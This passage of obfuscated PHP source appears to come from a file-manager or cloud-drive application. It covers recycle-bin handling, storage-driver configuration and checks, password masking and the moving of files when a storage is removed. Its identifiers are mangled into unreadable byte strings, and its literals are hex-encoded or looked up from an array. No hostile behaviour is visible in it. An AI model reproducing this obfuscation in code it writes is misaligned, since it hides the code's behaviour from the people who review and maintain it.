strtotime($Ş—®™˜‹[$æ¹ˆâá™[206]]); } $Ş—®™˜‹[$æ¹ˆâá™[206]] = $ÜğÔıÃÅ; return parent::update($Ì¶‚»Ú¿, $Ş—®™˜‹); } public function remove($ºğÉü¿) { $•êîö“ù = $this->listData($ºğÉü¿); if (!$•êîö“ù || $•êîö“ù[$_SERVER[óÔë„ú][191]]) { return !1; } return parent::remove($ºğÉü¿); } public function sort($îˆÏÅÀ, $ıç…ğığ) { return parent::update($îˆÏÅÀ, $ıç…ğığ); } public function enable($•É»¯‚Ë, $Ë¨íÈŞñ) { return parent::update($•É»¯‚Ë, array($_SERVER[óÔë„ú][2420] => $Ë¨íÈŞñ)); } private function initUserOption() { $§¯Ò ¬Å =& $_SERVER[óÔë„ú]; $this->optionType = $§¯Ò ¬Å[2421]; $this->modelType = $§¯Ò ¬Å[2422]; $this->field = array($§¯Ò ¬Å[2423], $§¯Ò ¬Å[32], $§¯Ò ¬Å[206], $§¯Ò ¬Å[33], $§¯Ò ¬Å[2424], $§¯Ò ¬Å[810], $§¯Ò ¬Å[226]); } public function userNoticeGet($©õâ»®£ = false) { $this->initUserOption(); return parent::listData($©õâ»®£, $_SERVER[óÔë„ú][475], !0); } public function userNoticeAdd($ê†à‘ á) { $ÑòŠİÉ® =& $_SERVER[óÔë„ú]; $this->initUserOption(); $É«°“Â‘ = $this->findByKey($ÑòŠİÉ®[2423], $ê†à‘ á[$ÑòŠİÉ®[475]]); if ($É«°“Â‘) { return !0; } $—¿¼¾•™ = array($ÑòŠİÉ®[2423] => $ê†à‘ á[$ÑòŠİÉ®[475]], $ÑòŠİÉ®[32] => $ê†à‘ á[$ÑòŠİÉ®[32]], $ÑòŠİÉ®[206] => $ê†à‘ á[$ÑòŠİÉ®[206]], $ÑòŠİÉ®[33] => isset($ê†à‘ á[$ÑòŠİÉ®[33]]) ? $ê†à‘ á[$ÑòŠİÉ®[33]] : 1, $ÑòŠİÉ®[2424] => isset($ê†à‘ á[$ÑòŠİÉ®[2424]]) ? $ê†à‘ á[$ÑòŠİÉ®[2424]] : 0, $ÑòŠİÉ®[810] => 0, $ÑòŠİÉ®[226] => 0); return parent::insert($—¿¼¾•™); } public function userNoticeEdit($®ª³œäĞ, $ŸÇŸ‰Ù÷) { $this->initUserOption(); return parent::update($®ª³œäĞ, $ŸÇŸ‰Ù÷); } } goto AŒ‹†¬‚‹; bÚ‰æØí…ö: class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\137\163\157\x75\x72\143\145\x5f\x72\145\x63\x79\143\x6c\x65"; protected $dataAuto = array(array("\x63\162\145\141\164\145\124\x69\155\x65", "\x74\151\155\x65", "\151\x6e\x73\145\x72\x74", "\146\165\156\x63\x74\151\157\x6e")); public function listData($©¯ª¤“Ö = false) { $‡ë“öÌ =& $_SERVER[óÔë„ú]; $©¯ª¤“Ö = $©¯ª¤“Ö ? $©¯ª¤“Ö : USER_ID; $×›ÂÛ´™ = $this->where(array($‡ë“öÌ[1749] => $©¯ª¤“Ö))->select(); return array_to_keyvalue($×›ÂÛ´™, $‡ë“öÌ[12], $‡ë“öÌ[193]); } public function moveToRecycle($ÃñÀ™ÉÊ) { $¾ı×Ìù— =& $_SERVER[óÔë„ú]; $åÇÎ¢Ê = Model($¾ı×Ìù—[1405]); $®Ã·”ÂÙ = $åÇÎ¢Ê->sourceInfo($ÃñÀ™ÉÊ); if (!$®Ã·”ÂÙ || $®Ã·”ÂÙ[$¾ı×Ìù—[505]] == $¾ı×Ìù—[91]) { return; } $æé¨¶¹è = array($¾ı×Ìù—[491] => $ÃñÀ™ÉÊ, $¾ı×Ìù—[1749] => USER_ID, $¾ı×Ìù—[648] => $®Ã·”ÂÙ[$¾ı×Ìù—[190]], $¾ı×Ìù—[649] => $®Ã·”ÂÙ[$¾ı×Ìù—[569]], $¾ı×Ìù—[652] => $®Ã·”ÂÙ[$¾ı×Ìù—[584]]); $this->add($æé¨¶¹è); $this->recycleMove($ÃñÀ™ÉÊ, 1); if ($®Ã·”ÂÙ[$¾ı×Ìù—[485]] == $¾ı×Ìù—[91]) { $èƒÁä„€ = array($¾ı×Ìù—[652] => array($¾ı×Ìù—[612], $®Ã·”ÂÙ[$¾ı×Ìù—[584]] . $ÃñÀ™ÉÊ . $¾ı×Ìù—[613])); $åÇÎ¢Ê->where($èƒÁä„€)->setField($¾ı×Ìù—[505], 1); } } public function clear() { $this->remove(!1); } public function remove($é“Çå¸ = false, $óÇĞ‡öñ = false) { $¸éÑğ€¢ =& $_SERVER[óÔë„ú]; $óÇĞ‡öñ = $óÇĞ‡öñ ? $óÇĞ‡öñ : USER_ID; $…‰ğ¡Ñ = Model($¸éÑğ€¢[1405]); $ÈÁô ÁÍ = $this->listData($óÇĞ‡öñ); $é“Çå¸ = $é“Çå¸ === !1 ? !1 : $é“Çå¸; $Œùæ¤—¥ = array(); foreach ($ÈÁô ÁÍ as $®…Î±æ³) { if ($é“Çå¸ != !1 && !in_array($®…Î±æ³, $é“Çå¸)) { continue; } $¬øš¹ìÙ = $…‰ğ¡Ñ->sourceInfo($®…Î±æ³); $…‰ğ¡Ñ->remove($®…Î±æ³, !1); $»÷¬à³ó = $¬øš¹ìÙ[$¸éÑğ€¢[190]] . $¸éÑğ€¢[11] . $¬øš¹ìÙ[$¸éÑğ€¢[569]]; $Œùæ¤—¥[$»÷¬à³ó] = array($¸éÑğ€¢[648] => $¬øš¹ìÙ[$¸éÑğ€¢[190]], $¸éÑğ€¢[569] => $¬øš¹ìÙ[$¸éÑğ€¢[569]]); $this->where(array($¸éÑğ€¢[193] => $®…Î±æ³))->delete(); } foreach ($Œùæ¤—¥ as $š—çî‹æ) { $…‰ğ¡Ñ->targetSpaceUpdate($š—çî‹æ[$¸éÑğ€¢[190]], $š—çî‹æ[$¸éÑğ€¢[569]]); } } public function restore($Ë•’ÓÉÚ = false) { $¼¨ˆ€Ä¬ = $this->listData(); $this->_restoreSource($¼¨ˆ€Ä¬, $Ë•’ÓÉÚ); } public function removeUserAll($ş¦é¡Â¥) { $this->remove(!1, $ş¦é¡Â¥); } public function restoreItem($¡–¤Àê) { $this->_restoreSource(array($¡–¤Àê), array($¡–¤Àê)); } private function _restoreSource($‘ªß¹×ù, $¹¯ÔÊÕ©) { $€“—“²‘ =& $_SERVER[óÔë„ú]; $¦Ñ­ª• = Model($€“—“²‘[1405]); $¹¯ÔÊÕ© = $¹¯ÔÊÕ© == !1 ? !1 : $¹¯ÔÊÕ©; if (!$‘ªß¹×ù) { return !0; } $¹İè¹¹š = array(); foreach ($‘ªß¹×ù as $íÃ‹“¤Š) { if ($¹¯ÔÊÕ© != !1 && !in_array($íÃ‹“¤Š, $¹¯ÔÊÕ©)) { continue; } $’ÜªéÛ = $¦Ñ­ª•->sourceInfo($íÃ‹“¤Š); $±¤•öÅÉ = $¦Ñ­ª•->sourceInfo($’ÜªéÛ[$€“—“²‘[192]]); if ($±¤•öÅÉ[$€“—“²‘[505]] == $€“—“²‘[91]) { continue; } $¦Ñ­ª•->lockMoveStart($íÃ‹“¤Š); $this->recycleMove($íÃ‹“¤Š, 0); if ($’ÜªéÛ[$€“—“²‘[485]] == $€“—“²‘[91]) { $à€óø¾æ = array($€“—“²‘[652] => array($€“—“²‘[612], $’ÜªéÛ[$€“—“²‘[584]] . $íÃ‹“¤Š . $€“—“²‘[613])); $¦Ñ­ª•->where($à€óø¾æ)->setField($€“—“²‘[505], 0); $this->restoreFolderChildren($íÃ‹“¤Š, $‘ªß¹×ù); } $this->where(array($€“—“²‘[193] => $íÃ‹“¤Š))->delete(); $¦Ñ­ª•->folderSizeReset($’ÜªéÛ[$€“—“²‘[192]]); $¹İè¹¹š[] = $’ÜªéÛ[$€“—“²‘[192]]; if ($’ÜªéÛ[$€“—“²‘[485]] == $€“—“²‘[91]) { $¹İè¹¹š[] = $íÃ‹“¤Š; } $¦Ñ­ª•->lockMoveEnd($íÃ‹“¤Š); } $¦Ñ­ª•->updateModifyTime($¹İè¹¹š); } private function restoreFolderChildren($õöê÷¯÷, $¤öæ¿¿À) { $ÔÑÙÈô‹ =& $_SERVER[óÔë„ú]; $æ„ ¤³ = Model($ÔÑÙÈô‹[1405]); $®ÀæœëÛ = array($ÔÑÙÈô‹[193] => array($ÔÑÙÈô‹[7], array())); foreach ($¤öæ¿¿À as $ ¿³ùü¯) { if ($ ¿³ùü¯ == $õöê÷¯÷) { continue; } if (!$æ„ ¤³->isParentOf($õöê÷¯÷, $ ¿³ùü¯)) { continue; } $¡Ÿ×…‚ = $æ„ ¤³->sourceInfo($ ¿³ùü¯); if ($¡Ÿ×…‚[$ÔÑÙÈô‹[485]] == $ÔÑÙÈô‹[91]) { $®ÀæœëÛ[] = array($ÔÑÙÈô‹[652] => array($ÔÑÙÈô‹[612], $¡Ÿ×…‚[$ÔÑÙÈô‹[584]] . $ ¿³ùü¯ . $ÔÑÙÈô‹[613])); } else { $®ÀæœëÛ[$ÔÑÙÈô‹[193]][1][] = $ ¿³ùü¯; } } if (!$®ÀæœëÛ[$ÔÑÙÈô‹[193]][1]) { unset($®ÀæœëÛ[$ÔÑÙÈô‹[193]]); } if (!$®ÀæœëÛ) { return; } if (is_array($®ÀæœëÛ[$ÔÑÙÈô‹[193]]) && is_array($®ÀæœëÛ[$ÔÑÙÈô‹[193]][1])) { $®ÀæœëÛ[$ÔÑÙÈô‹[193]][1] = array_unique($®ÀæœëÛ[$ÔÑÙÈô‹[193]][1]); } $®ÀæœëÛ[$ÔÑÙÈô‹[1063]] = $ÔÑÙÈô‹[2059]; $æ„ ¤³->where($®ÀæœëÛ)->setField($ÔÑÙÈô‹[505], 1); } private function recycleMove($ÈºÏİĞ°, $²´€Ìİœ = 1) { $½Ê§úæÎ =& $_SERVER[óÔë„ú]; $œ“¦Ã£ = Model($½Ê§úæÎ[1405]); $ê…Û‚Ÿä = Model($½Ê§úæÎ[2280]); $¿§ Ëš¿ = array($½Ê§úæÎ[193] => $ÈºÏİĞ°); if ($²´€Ìİœ) { $œ“¦Ã£->where($¿§ Ëš¿)->setField($½Ê§úæÎ[505], 1); $ê…Û‚Ÿä->eventRecycle($ÈºÏİĞ°, $½Ê§úæÎ[2281]); } else { $¤ú‰ô£ = $œ“¦Ã£->where($¿§ Ëš¿)->find(); $ÃÄÌ”õ = $¤ú‰ô£[$½Ê§úæÎ[485]] == $½Ê§úæÎ[91]; $ôƒ±¨ÚŞ = $œ“¦Ã£->fileNameAuto($¤ú‰ô£[$½Ê§úæÎ[192]], $¤ú‰ô£[$½Ê§úæÎ[32]], REPEAT_RENAME_FOLDER, $ÃÄÌ”õ); if ($ôƒ±¨ÚŞ != $¤ú‰ô£[$½Ê§úæÎ[32]]) { $œ“¦Ã£->rename($ÈºÏİĞ°, $ôƒ±¨ÚŞ); } $œ“¦Ã£->where($¿§ Ëš¿)->setField($½Ê§úæÎ[505], 0); $ê…Û‚Ÿä->eventRecycle($ÈºÏİĞ°, $½Ê§úæÎ[2282]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\56\x73\157\165\x72\143\145\123\145\x63\x72\145\x74\x4c\x69\x73\164"; public $field = array("\163\157\x75\x72\143\145\x49\x44", "\164\171\x70\145\111\104", "\x63\x72\x65\x61\x74\x65\125\163\x65\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\56\163\164\x6f\162\x61\147\x65\x4c\151\163\x74"; public $field = array("\156\x61\155\x65", "\163\151\x7a\145\115\141\170", "\x73\171\163\x74\145\155", "\144\145\x66\141\165\154\x74", "\x64\x72\x69\166\x65\162", "\x63\x6f\x6e\146\x69\147"); public function listData($ëÁ·ƒçØ = false, $ş”ÈÅ×Á = "\x6d\x6f\144\151\146\171\x54\151\x6d\x65", $‹è¯½°æ = false) { $ÉÁ¿ñâÁ =& $_SERVER[óÔë„ú]; $’™Û•Ì = parent::listData($ëÁ·ƒçØ, $ş”ÈÅ×Á, $‹è¯½°æ); if ($ëÁ·ƒçØ) { return $’™Û•Ì; } $†ÃËÙĞƒ = array(); if ($GLOBALS[$ÉÁ¿ñâÁ[2283]]) { $†ÃËÙĞƒ = $this->ioSizeUseGet(array_to_keyvalue($’™Û•Ì, $ÉÁ¿ñâÁ[12], $ÉÁ¿ñâÁ[475])); } foreach ($’™Û•Ì as $÷ˆøá­ => $õÌ‰àÚ) { unset($’™Û•Ì[$÷ˆøá­][$ÉÁ¿ñâÁ[6]]); $’™Û•Ì[$÷ˆøá­][$ÉÁ¿ñâÁ[1945]] = isset($†ÃËÙĞƒ[$õÌ‰àÚ[$ÉÁ¿ñâÁ[475]]]) ? $†ÃËÙĞƒ[$õÌ‰àÚ[$ÉÁ¿ñâÁ[475]]] : 0; } return $’™Û•Ì; } public function ioSizeUseGet($ÔŒ—§Ö) { $¼÷µø— =& $_SERVER[óÔë„ú]; if (!$ÔŒ—§Ö) { return array(); } $ÃïÅ•úå = $¼÷µø—[2284] . implode($¼÷µø—[50], $ÔŒ—§Ö); $¿êë÷Ç = Cache::get($ÃïÅ•úå); if ($¿êë÷Ç) { return $¿êë÷Ç; } $‰ÈÇïè­ = array($¼÷µø—[877] => $¼÷µø—[475], $¼÷µø—[2285] => $¼÷µø—[79]); $ÎÍİÒÈï = array($¼÷µø—[877] => array($¼÷µø—[7], $ÔŒ—§Ö)); $¿êë÷Ç = Model($¼÷µø—[849])->field($‰ÈÇïè­)->where($ÎÍİÒÈï)->group($¼÷µø—[877])->select(); $¿êë÷Ç = array_to_keyvalue($¿êë÷Ç, $¼÷µø—[475], $¼÷µø—[79]); Cache::set($ÃïÅ•úå, $¿êë÷Ç, 600); return $¿êë÷Ç; } public function getConfig($î¹óĞÈ£) { $¿ƒÛ÷ÓÔ = parent::listData($î¹óĞÈ£); return json_decode($¿ƒÛ÷ÓÔ[$_SERVER[óÔë„ú][6]], !0); } public function update($ó®¥ÌŸ, $Û²Ù­«) { $óùîÙüù =& $_SERVER[óÔë„ú]; $†™ú‡›Ú = $Û²Ù­«[$óùîÙüù[32]]; $‚ÖŠËÕâ = array_to_keyvalue(parent::listData(), $óùîÙüù[32]); if (isset($‚ÖŠËÕâ[$†™ú‡›Ú]) && $‚ÖŠËÕâ[$†™ú‡›Ú][$óùîÙüù[475]] != $ó®¥ÌŸ) { return !1; } $this->checkPwd($ó®¥ÌŸ, $Û²Ù­«); if (isset($Û²Ù­«[$óùîÙüù[2286]]) && $Û²Ù­«[$óùîÙüù[2286]] == $óùîÙüù[91]) { $this->checkConfig($Û²Ù­«); } unset($Û²Ù­«[$óùîÙüù[2286]]); $öÄÅ‹Ù‚ = parent::update($ó®¥ÌŸ, $Û²Ù­«); if ($öÄÅ‹Ù‚ && $Û²Ù­«[$óùîÙüù[37]]) { $ÍàÑƒ¢Ë = 0; foreach ($‚ÖŠËÕâ as $•­± £º) { if ($•­± £º[$óùîÙüù[37]] && $•­± £º[$óùîÙüù[475]] != $ó®¥ÌŸ) { $ÍàÑƒ¢Ë = $•­± £º[$óùîÙüù[475]]; parent::update($•­± £º[$óùîÙüù[475]], array($óùîÙüù[37] => 0)); } } $this->updateBackup($ó®¥ÌŸ, $ÍàÑƒ¢Ë); } return $öÄÅ‹Ù‚; } public function add($Ü†‰èªì) { $Øõ¯ŸØ× =& $_SERVER[óÔë„ú]; $«éŠÄ®‡ = array_to_keyvalue(parent::listData(), $Øõ¯ŸØ×[32]); if (isset($«éŠÄ®‡[$Ü†‰èªì[$Øõ¯ŸØ×[32]]])) { return !1; } $this->checkConfig($Ü†‰èªì); $£Ø‹§Éı = parent::insert($Ü†‰èªì); if ($£Ø‹§Éı && $Ü†‰èªì[$Øõ¯ŸØ×[37]]) { foreach ($«éŠÄ®‡ as $òÙ£Ğ‹Ô) { if ($òÙ£Ğ‹Ô[$Øõ¯ŸØ×[37]]) { parent::update($òÙ£Ğ‹Ô[$Øõ¯ŸØ×[475]], array($Øõ¯ŸØ×[37] => 0)); } } } return $£Ø‹§Éı; } public function updateBackup($óùÅÑÛ¨, $ı’Ğ¢Å¸) { $Ğç›ÙëŸ =& $_SERVER[óÔë„ú]; if (!$ı’Ğ¢Å¸) { return; } $Õìó«õé = Model($Ğç›ÙëŸ[808])->config(); if ($Õìó«õé[$Ğç›ÙëŸ[1728]] != $Ğç›ÙëŸ[91] || $Õìó«õé[$Ğç›ÙëŸ[812]] != $ı’Ğ¢Å¸) { return; } $ÉÄÃå‘ = Model($Ğç›ÙëŸ[830])->get($Ğç›ÙëŸ[843]); $ÉÄÃå‘ = json_decode($ÉÄÃå‘, !0); if (!$ÉÄÃå‘) { return; } $ÉÄÃå‘[$Ğç›ÙëŸ[812]] = $óùÅÑÛ¨; Model($Ğç›ÙëŸ[830])->set(array($Ğç›ÙëŸ[843] => $ÉÄÃå‘)); } public function checkPwd($º™Èîİ, &$Æîñöƒ ) { $Ê›şüÑ¡ =& $_SERVER[óÔë„ú]; if (empty($Æîñöƒ [$Ê›şüÑ¡[6]])) { return; } $€–áÖµµ = json_decode($Æîñöƒ [$Ê›şüÑ¡[6]], !0); $Ü¨ñÏ† = $Ê›şüÑ¡[12]; $İ¤¨´ª² = array($Ê›şüÑ¡[2287], $Ê›şüÑ¡[2288], $Ê›şüÑ¡[952]); foreach ($İ¤¨´ª² as $«×õ“§Ï) { if (isset($€–áÖµµ[$«×õ“§Ï])) { $Ü¨ñÏ† = $«×õ“§Ï; break; } } if (!$Ü¨ñÏ†) { return; } $”ÉäˆÅ = $this->getConfig($º™Èîİ); $¥‚¬¢“Ä = $”ÉäˆÅ[$Ü¨ñÏ†]; $ÙÂÀ›ğº = $€–áÖµµ[$Ü¨ñÏ†]; if ($ÙÂÀ›ğº == str_repeat($Ê›şüÑ¡[220], strlen($¥‚¬¢“Ä))) { $€–áÖµµ[$Ü¨ñÏ†] = $¥‚¬¢“Ä; $Æîñöƒ [$Ê›şüÑ¡[6]] = json_encode($€–áÖµµ); } else { if ($ÙÂÀ›ğº != $¥‚¬¢“Ä) { $Æîñöƒ [$Ê›şüÑ¡[2286]] = $Ê›şüÑ¡[91]; } } } public function checkConfig(&$®À¢©³ , $™—Ö¤¥× = false) { $Ã¶û¥¶´ =& $_SERVER[óÔë„ú]; $ÔÈÂ®ë— = strtolower($®À¢©³ [$Ã¶û¥¶´[98]]); $ä €ÓâØ = json_decode($®À¢©³ [$Ã¶û¥¶´[6]], !0); foreach ($ä €ÓâØ as $æÎî´Ô£ => $“®·¾©Ü) { if (is_string($“®·¾©Ü)) { $ä €ÓâØ[$æÎî´Ô£] = trim($“®·¾©Ü); } } $ä €ÓâØ[$Ã¶û¥¶´[2289]] = rand_string(6); $·ò™ªÏÉ = $GLOBALS[$Ã¶û¥¶´[6]][$Ã¶û¥¶´[92]][$Ã¶û¥¶´[885]]; $ıöğïˆÑ = isset($·ò™ªÏÉ[$ÔÈÂ®ë—]) ? $·ò™ªÏÉ[$ÔÈÂ®ë—] : ucfirst($ÔÈÂ®ë—); $¹İ©÷œÆ = $Ã¶û¥¶´[77] . $ıöğïˆÑ; if (!$ıöğïˆÑ || !class_exists($¹İ©÷œÆ)) { if ($™—Ö¤¥×) { return LNG($Ã¶û¥¶´[2290]); } write_log(array($Ã¶û¥¶´[2291], $®À¢©³ , get_caller_info()), $Ã¶û¥¶´[215]); show_json(LNG($Ã¶û¥¶´[2290]), !1, $®À¢©³ ); } $ë šÄ¬¹ = new $¹İ©÷œÆ($ä €ÓâØ); if (in_array($ÔÈÂ®ë—, $ë šÄ¬¹->objectDriver)) { try { if (!$ë šÄ¬¹->isBucketCors() && !$ë šÄ¬¹->setBucketCors()) { $Âƒ„‡©ù = LNG($Ã¶û¥¶´[2292]); $Âƒ„‡©ù .= $Ã¶û¥¶´[2293] . LNG($Ã¶û¥¶´[2294]); } } catch (Exception $òŠ„î¦…) { $Âƒ„‡©ù = $òŠ„î¦…->getMessage(); } if (isset($Âƒ„‡©ù)) { return $this->_parseError($Âƒ„‡©ù, $ÔÈÂ®ë—, $™—Ö¤¥×); } if ($ÔÈÂ®ë— == $Ã¶û¥¶´[68] && !$ë šÄ¬¹->checkRegion()) { return $this->_parseError(LNG($Ã¶û¥¶´[2295]), $ÔÈÂ®ë—, $™—Ö¤¥×); } } $»»··¯· = rtrim($ä €ÓâØ[$Ã¶û¥¶´[1247]], $Ã¶û¥¶´[8]) . $Ã¶û¥¶´[8]; $²ÔØ¡˜¼ = $ë šÄ¬¹->getPath($»»··¯· . $Ã¶û¥¶´[1253]); try { if ($ÔÈÂ®ë— == $Ã¶û¥¶´[109]) { $ë šÄ¬¹->mkdir($»»··¯·); } $ºçğ‘“ = $ë šÄ¬¹->mkfile($²ÔØ¡˜¼); if (!$ºçğ‘“) { $Âƒ„‡©ù = LNG($Ã¶û¥¶´[2292]); } } catch (Exception $òŠ„î¦…) { $Âƒ„‡©ù = $òŠ„î¦…->getMessage(); } if (isset($Âƒ„‡©ù)) { return $this->_parseError($Âƒ„‡©ù, $ÔÈÂ®ë—, $™—Ö¤¥×); } $ä €ÓâØ[$Ã¶û¥¶´[1247]] = $»»··¯·; $®À¢©³ [$Ã¶û¥¶´[6]] = json_encode($ä €ÓâØ); $®À¢©³ [$Ã¶û¥¶´[98]] = $ıöğïˆÑ; return !0; } private function _parseError($†Ä°±Ù©, $¨´’Í¸, $úåèç¯Ù = false) { $÷ŞíĞ¹ò =& $_SERVER[óÔë„ú]; if ($¨´’Í¸ == $÷ŞíĞ¹ò[68] && stripos($†Ä°±Ù©, $÷ŞíĞ¹ò[2296])) { $Ãº‰à»Ñ = explode($÷ŞíĞ¹ò[10], $†Ä°±Ù©); $Âñš•² = isset($Ãº‰à»Ñ[1]) ? $Ãº‰à»Ñ[1] : $÷ŞíĞ¹ò[12]; $ÌÃÇÂî× = array($÷ŞíĞ¹ò[2297] => LNG($÷ŞíĞ¹ò[2298]), $÷ŞíĞ¹ò[2299] => LNG($÷ŞíĞ¹ò[2300])); if (isset($ÌÃÇÂî×[$Âñš•²])) { $†Ä°±Ù© = $ÌÃÇÂî×[$Âñš•²]; } } if (stripos($†Ä°±Ù©, $÷ŞíĞ¹ò[2301]) === 0) { $şëœäÍ­ = strpos($†Ä°±Ù©, $÷ŞíĞ¹ò[178]); if ($şëœäÍ­ === !1) { $şëœäÍ­ = strpos($†Ä°±Ù©, $÷ŞíĞ¹ò[4]); } if ($şëœäÍ­ !== !1) { $†Ä°±Ù© = substr($†Ä°±Ù©, $şëœäÍ­ + 1); } } $†Ä°±Ù© = LNG($÷ŞíĞ¹ò[1256]) . $†Ä°±Ù©; if ($úåèç¯Ù) { return $†Ä°±Ù©; } show_json($†Ä°±Ù©, !1); } public function driverListSystem() { $·ÓîÈ² =& $_SERVER[óÔë„ú]; $¯¨÷ÎÅú = parent::listData(); $àÕÃ¨‰ = array(); foreach ($¯¨÷ÎÅú as $´¯§—Î„) { unset($´¯§—Î„[$·ÓîÈ²[231]], $´¯§—Î„[$·ÓîÈ²[88]]); $´¯§—Î„[$·ÓîÈ²[6]] = json_decode($´¯§—Î„[$·ÓîÈ²[6]], !0); $àÕÃ¨‰[] = $´¯§—Î„; } return $àÕÃ¨‰; } public function defaultDriver() { $Ú­îü©× =& $_SERVER[óÔë„ú]; $¼¿Á–ºÆ = parent::listData(); $ı¦ä¹†æ = array_filter_by_field($¼¿Á–ºÆ, $Ú­îü©×[37], 1); $ı¦ä¹†æ = $ı¦ä¹†æ[0]; if ($ı¦ä¹†æ) { $ı¦ä¹†æ[$Ú­îü©×[6]] = json_decode($ı¦ä¹†æ[$Ú­îü©×[6]], !0); } return $ı¦ä¹†æ; } public function driverInfo($ªˆ´÷È) { $×„¹×ß¶ =& $_SERVER[óÔë„ú]; $ ˆæ‹‹ä = array_to_keyvalue(parent::listData(), $×„¹×ß¶[475]); if (!isset($ ˆæ‹‹ä[$ªˆ´÷È])) { return !1; } $¡şé€çê = $ ˆæ‹‹ä[$ªˆ´÷È]; $¡şé€çê[$×„¹×ß¶[6]] = json_decode($¡şé€çê[$×„¹×ß¶[6]], !0); return $¡şé€çê; } public function remove($ö¦Å„à¢) { $this->removeShareItems($ö¦Å„à¢); return parent::remove($ö¦Å„à¢); } public function removeWithFile($ë¥ßÊ¹ã, $ñÇ´éÕ­, $ó×–„Å¹, $¸‹àåˆÁ = false) { $©ŞÕî” =& $_SERVER[óÔë„ú]; $ó¨»ÄíÑ = array($©ŞÕî”[877] => $ë¥ßÊ¹ã); $ï‹ááÆ° = Model($©ŞÕî”[544])->where($ó¨»ÄíÑ)->count(); $ÅäĞ–°Ã = Model($©ŞÕî”[544])->where($ó¨»ÄíÑ)->sum($©ŞÕî”[79]); $±«×›³ = $ñÇ´éÕ­ . $©ŞÕî”[2302] . $ë¥ßÊ¹ã; $½ßØÄÑİ = LNG($ñÇ´éÕ­ == $©ŞÕî”[620] ? $©ŞÕî”[2303] : $©ŞÕî”[2304]); $ìóŞ†©© = new TaskFileTransfer($±«×›³, $©ŞÕî”[215], $ï‹ááÆ°, $½ßØÄÑİ . $©ŞÕî”[462] . $ó×–„Å¹[$©ŞÕî”[32]] . $©ŞÕî”[214] . $ë¥ßÊ¹ã); $ìóŞ†©©->task[$©ŞÕî”[823]] = (double) $ÅäĞ–°Ã; $Éáè™“Á = KodIO::defaultDriver(); $÷Ÿ˜ˆšÒ = $Éáè™“Á[$©ŞÕî”[475]]; $¯«“ıÊå = $İáìøØ’ = $úıà­Èä = array(); $œ®ûäç  = Model($©ŞÕî”[230])->where($ó¨»ÄíÑ)->field($©ŞÕî”[2305])->select(); foreach ($œ®ûäç  as $¹õ‘İäã) { $ £”ßÙË = $¹õ‘İäã[$©ŞÕî”[541]]; if ($¸‹àåˆÁ) { $İáìøØ’[] = $ £”ßÙË; continue; } $¡ïè„ÃÂ = $¹õ‘İäã[$©ŞÕî”[87]]; $Ã¬º¹×ˆ = get_path_father($¡ïè„ÃÂ); $úıà­Èä[] = $Ã¬º¹×ˆ; $Ã¬º¹×ˆ = str_replace("\173\x69\x6f\72{$ë¥ßÊ¹ã}\175\57", "\173\x69\157\x3a{$÷Ÿ˜ˆšÒ}\x7d\57", $Ã¬º¹×ˆ); if (!IO::exist($¡ïè„ÃÂ)) { $¯«“ıÊå[] = $ £”ßÙË; $ìóŞ†©©->updateFileEnd($¹õ‘İäã[$©ŞÕî”[32]], $¹õ‘İäã[$©ŞÕî”[79]]); write_log($©ŞÕî”[2306] . $¡ïè„ÃÂ, $©ŞÕî”[1888]); continue; } $“İÛùÂé = IO::move($¡ïè„ÃÂ, $Ã¬º¹×ˆ, REPEAT_RENAME); if (!$“İÛùÂé) { $İáìøØ’[] = $ £”ßÙË; $ìóŞ†©©->updateFileEnd($¹õ‘İäã[$©ŞÕî”[32]], $¹õ‘İäã[$©ŞÕî”[79]]); write_log($©ŞÕî”[2307] . $¡ïè„ÃÂ, $©ŞÕî”[1888]); continue; } $ó¨»ÄíÑ = array($©ŞÕî”[541] => $ £”ßÙË); $ØäÍ¢¬å = array($©ŞÕî”[877] => $÷Ÿ˜ˆšÒ, $©ŞÕî”[87] => $“İÛùÂé); Model($©ŞÕî”[230])->where($ó¨»ÄíÑ)->save($ØäÍ¢¬å); } $™ÔÒğŸ„ = $ìóŞ†©©->task; if (!$¸‹àåˆÁ) { Cache::set($±«×›³, $™ÔÒğŸ„); } $ìóŞ†©©->end(); $¯«“ıÊå = array_unique($¯«“ıÊå); $İáìøØ’ = array_unique($İáìøØ’); if (!$¸‹àåˆÁ && ($¯«“ıÊå || $İáìøØ’)) { $ëù‘æ¤Ó = array(); if ($¯«“ıÊå) { $ëù‘æ¤Ó[] = sprintf(LNG($©ŞÕî”[2308]), count($¯«“ıÊå)); } if ($İáìøØ’) { $ëù‘æ¤Ó[] = sprintf(LNG($©ŞÕî”[2309]), count($İáìøØ’)); } $ëù‘æ¤Ó = sprintf(LNG($©ŞÕî”[2310]), implode($©ŞÕî”[2311], $ëù‘æ¤Ó)) . $©ŞÕî”[2312] . date($©ŞÕî”[2313]) . $©ŞÕî”[2314]; if ($ñÇ´éÕ­ == $©ŞÕî”[1925]) { $ëù‘æ¤Ó .= $©ŞÕî”[2315] . LNG($©ŞÕî”[2316]); } $™ÔÒğŸ„[$©ŞÕî”[1249]] = $ëù‘æ¤Ó; Cache::set($±«×›³, $™ÔÒğŸ„); unset($ó×–„Å¹[$©ŞÕî”[6]]); $ŞíÉ®§ = array($©ŞÕî”[475] => $ë¥ßÊ¹ã, $©ŞÕî”[2195] => $©ŞÕî”[620], $©ŞÕî”[32] => $ó×–„Å¹[$©ŞÕî”[32]], $©ŞÕî”[1274] => $ó×–„Å¹); Hook::trigger($©ŞÕî”[1769], array($©ŞÕî”[1274] => $ŞíÉ®§, $©ŞÕî”[1284] => !0)); show_json($ëù‘æ¤Ó, !1, 100111); } if ($ñÇ´éÕ­ == $©ŞÕî”[620]) { return !0; } if ($¯«“ıÊå || $İáìøØ’) { $Èù“³·š = array_merge($¯«“ıÊå, $İáìøØ’); $Èù“³·š = array_filter(array_unique($Èù“³·š)); $this->removeByFileID($Èù“³·š); } if ($úıà­Èä) { $úıà­Èä = array_filter(array_unique($úıà­Èä)); foreach ($úıà­Èä as $¡ïè„ÃÂ) { $µïÛïí = IO::has($¡ïè„ÃÂ, !0); if (!$µïÛïí[$©ŞÕî”[239]] && !$µïÛïí[$©ŞÕî”[240]]) { IO::remove($¡ïè„ÃÂ); } } } return $this->remove($ë¥ßÊ¹ã); } private function removeByFileID($îºîàÚÊ = array()) { $Çˆ”—Å¨ =& $_SERVER[óÔë„ú]; if (empty($îºîàÚÊ)) { return; } $Â§åˆûÀ = array($Çˆ”—Å¨[541] => 